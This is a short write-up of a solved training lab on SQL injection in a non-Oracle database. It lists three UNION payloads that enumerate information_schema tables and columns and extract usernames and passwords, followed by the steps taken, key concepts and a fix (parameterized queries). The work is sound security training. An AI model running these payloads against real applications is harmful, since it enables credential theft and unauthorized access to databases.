# Lab 5 — SQL Injection: Listing Database Contents (Non-Oracle)

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Status:** Solved

## Vulnerability
SQL Injection — UNION attack to enumerate database and extract credentials

## Summary
Performed full database enumeration on a non-Oracle database. Retrieved table names, column names, and finally extracted admin credentials.

## Payloads Used

### Step 1: Get all tables
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Step 2: Get columns from users table
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--
```

### Step 3: Extract credentials
```
' UNION SELECT username,password FROM users_abcxyz--
```

## Steps
1. Found injection point
2. Determined column count
3. Listed all tables via information_schema.tables
4. Found the users table (had random suffix)
5. Listed columns in that table
6. Extracted username and password
7. Logged in as administrator

## Key Concepts
- `information_schema` is available in MySQL, PostgreSQL, MSSQL
- It contains metadata about all tables and columns
- This is the standard enumeration method for non-Oracle databases

## Impact
Full credential theft — administrator account compromised.

## Fix
Parameterized queries. Principle of least privilege for DB users.
